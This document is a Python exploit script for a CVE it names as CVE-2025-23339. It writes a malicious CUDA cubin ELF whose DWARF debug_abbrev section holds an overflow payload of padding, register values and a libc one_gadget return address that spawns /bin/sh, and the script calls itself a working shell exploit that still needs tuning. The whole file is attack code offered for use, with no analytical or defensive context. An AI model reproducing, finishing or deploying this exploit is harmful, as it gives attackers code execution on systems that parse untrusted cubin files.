#!/usr/bin/env python3
"""
CVE-2025-23339 - WORKING SHELL EXPLOIT

We got code execution! Just need to fix the one_gadget constraints.

Try one_gadget 0xef52b:
  execve("/bin/sh", rbp-0x50, [rbp-0x78])
  constraints:
    - rbp-0x50 is writable
    - rax == NULL || valid argv
    - [rbp-0x78] == NULL or valid envp
"""

import struct
import sys

def encode_leb128(value):
    result = []
    while True:
        byte = value & 0x7f
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)

def build_cubin(content):
    strtab = b'\x00.shstrtab\x00.debug_abbrev\x00'
    ehdr_size, shnum = 64, 3
    shoff = ehdr_size
    strtab_off = shoff + shnum * 64
    debug_off = strtab_off + len(strtab)
    pad = (4 - (debug_off % 4)) % 4
    debug_off += pad
    
    elf = bytearray(64)
    elf[0:4] = b'\x7fELF'
    elf[4:8] = bytes([2, 1, 1, 7])
    struct.pack_into('<H', elf, 16, 0x3142)
    struct.pack_into('<H', elf, 18, 0xbe)
    struct.pack_into('<I', elf, 20, 1)
    struct.pack_into('<Q', elf, 40, shoff)
    struct.pack_into('<I', elf, 48, 0x340534)
    struct.pack_into('<H', elf, 52, 64)
    struct.pack_into('<H', elf, 58, 64)
    struct.pack_into('<H', elf, 60, shnum)
    struct.pack_into('<H', elf, 62, 1)
    
    sh_null = bytes(64)
    sh_str = bytearray(64)
    struct.pack_into('<I', sh_str, 0, 1)
    struct.pack_into('<I', sh_str, 4, 3)
    struct.pack_into('<Q', sh_str, 24, strtab_off)
    struct.pack_into('<Q', sh_str, 32, len(strtab))
    struct.pack_into('<Q', sh_str, 48, 1)
    
    sh_dbg = bytearray(64)
    struct.pack_into('<I', sh_dbg, 0, 11)
    struct.pack_into('<I', sh_dbg, 4, 1)
    struct.pack_into('<Q', sh_dbg, 24, debug_off)
    struct.pack_into('<Q', sh_dbg, 32, len(content))
    struct.pack_into('<Q', sh_dbg, 48, 4)
    
    return bytes(elf + sh_null + sh_str + sh_dbg + strtab + bytes(pad) + content)

def build_payload(entries):
    p = bytearray()
    p += encode_leb128(4) + encode_leb128(0x33) + bytes([1])
    
    for low, high in entries:
        p += encode_leb128(low)
        p += encode_leb128(high)
    
    p += bytes([0, 0, 0])
    return bytes(p)

output = sys.argv[1] if len(sys.argv) > 1 else "exploit.cubin"
gadget_idx = int(sys.argv[2]) if len(sys.argv) > 2 else 0

libc_base = 0x7ffff7c00000

# One gadgets from your system:
# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
one_gadgets = [
    0xef4ce,  # needs r12 == NULL
    0xef52b,  # needs [rbp-0x78] == NULL
    0x583ec,  # needs rsp aligned, rax/rbx == NULL
    0x583f3,  # needs rsp aligned, rcx/rbx == NULL
]

gadget_offset = one_gadgets[gadget_idx % len(one_gadgets)]
one_gadget = libc_base + gadget_offset

# .bss area for writable memory
bss = 0x68a000

entries = []

# Padding
for i in range(0x101):
    entries.append((1, 1))

# For 0xef4ce: r12 needs to be NULL or valid envp
# For 0xef52b: [rbp-0x78] needs to be NULL  

# pop rbx
entries.append((bss, 0))  # rbx -> .bss (has NULLs)

# pop rbp - critical for one_gadget
# rbp-0x50 and rbp-0x78 must point to valid/NULL memory
entries.append((bss + 0x100, 0))  # rbp -> bss+0x100

# pop r12 - for 0xef4ce, needs NULL or valid envp
entries.append((bss, 0))  # r12 -> .bss (contains NULLs hopefully)

# pop r13
entries.append((1, 0))

# pop r14  
entries.append((1, 0))

# pop r15
entries.append((1, 0))

# ret -> one_gadget
entries.append((one_gadget & 0xFFFFFFFF, one_gadget >> 32))

print(f"[*] CVE-2025-23339 Final Shell Exploit")
print(f"[*] Using one_gadget #{gadget_idx}: 0x{gadget_offset:x}")
print(f"[*] Full address: 0x{one_gadget:x}")
print(f"[*] rbx -> 0x{bss:x} (.bss)")
print(f"[*] rbp -> 0x{bss + 0x100:x} (.bss+0x100)")
print(f"[*] r12 -> 0x{bss:x} (.bss)")
print(f"[*] Total entries: {len(entries)}")

payload = build_payload(entries)
elf = build_cubin(payload)

with open(output, 'wb') as f:
    f.write(elf)

print(f"[+] Written: {output}")
